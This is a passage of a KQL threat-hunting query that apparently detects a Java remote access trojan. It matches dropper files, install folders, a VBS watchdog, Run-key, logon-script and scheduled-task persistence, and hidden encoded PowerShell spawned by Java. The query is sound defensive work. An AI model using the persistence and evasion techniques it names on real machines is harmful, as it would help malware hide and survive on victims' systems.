    or (FolderPath contains "r.jar" and FileName == "r.jar")
    | extend QuerySource = "DropperIndicators";
let RATInstaller =
    DeviceFileEvents
    | where (FolderPath has_all("users", "appdata", "roaming", ".cache") and InitiatingProcessFileName contains "java")
    or FolderPath contains "QuimaLogs"
    or FolderPath contains "ssa_document.lib"
    | extend QuerySource = "RATInstaller";
let WatchdogIndicator =
    DeviceFileEvents
    | where FolderPath contains @"Microsoft\Windows\Templates"
    | where FileName has_any("sys_wd.vbs", ".wd_stop")
    | extend QuerySource = "WatchdogIndicator";
let StartupPersistence =
    DeviceFileEvents
    | where FolderPath contains @"Microsoft\Windows\Start Menu\Programs\Startup"
    | where FileName endswith ".lnk" or FileName endswith ".bat"
    | extend QuerySource = "StartupPersistence";
let ScheduledTaskPersistence =
    DeviceProcessEvents
    | where InitiatingProcessCommandLine has_all("Register-ScheduledTask", "New-ScheduledTaskTrigger", "AtLogOn", "-User $env:USERNAME", "-Xmx128m", "jar")
    | extend QuerySource = "Scheduled Task Persistence"
    | project QuerySource, TimeGenerated, DeviceName, ActionType, FileName, FolderPath,
              InitiatingProcessCommandLine, InitiatingProcessFileName, ProcessCommandLine;
let RunKeyPersistence =
    DeviceRegistryEvents
    | where ActionType contains "RegistryKeyCreated" or ActionType contains "RegistryValueSet"
    | where RegistryKey contains @"Software\Microsoft\Windows\CurrentVersion\Run" or (RegistryKey contains "Environment" and RegistryValueName contains "UserInitMprLogonScript")
    | where RegistryValueData has_any(".jar", ".vbs")
    | extend QuerySource = "Run Key Registry Persistence"
    | project QuerySource, TimeGenerated, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData;
let JavaSpawnedCommands =
    DeviceProcessEvents
    | where InitiatingProcessFileName has_any("java", "javaw")
    | extend CommandType = case(
        ProcessCommandLine has_all("cmd", "reg", "add", "HKCU", "Run"), "Registry Run key persistence",
        ProcessCommandLine has_all("cmd", "reg", "add", "HKCU", "UserInitMprLogonScript"), "Logon script persistence install",
        ProcessCommandLine has_all("powershell", "nop", "ep", "hidden", "enc"), "Watchdog kill & Register-ScheduledTask",
        ProcessCommandLine has_all("powershell", "Invoke-WmiMethod", "Win32_Process"), "Watchdog relaunch",
        ProcessCommandLine has_all("schtasks", "delete", "tn"), "Scheduled task removal",
        ProcessCommandLine has_all("java", "xmx128m", "jar"), "Persistence launch",
        "Null"
    )
    | where CommandType != "Null"
    | extend QuerySource = "Java-Spawned Command"
    | project QuerySource, TimeGenerated, DeviceName, ActionType, FileName, FolderPath, SHA256,
              CommandType, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessFileName;
union kind=outer DropperIndicators, RATInstaller, WatchdogIndicator, ScheduledTaskPersistence, RunKeyPersistence, JavaSpawnedCommands
| sort by DeviceName asc, TimeGenerated asc
```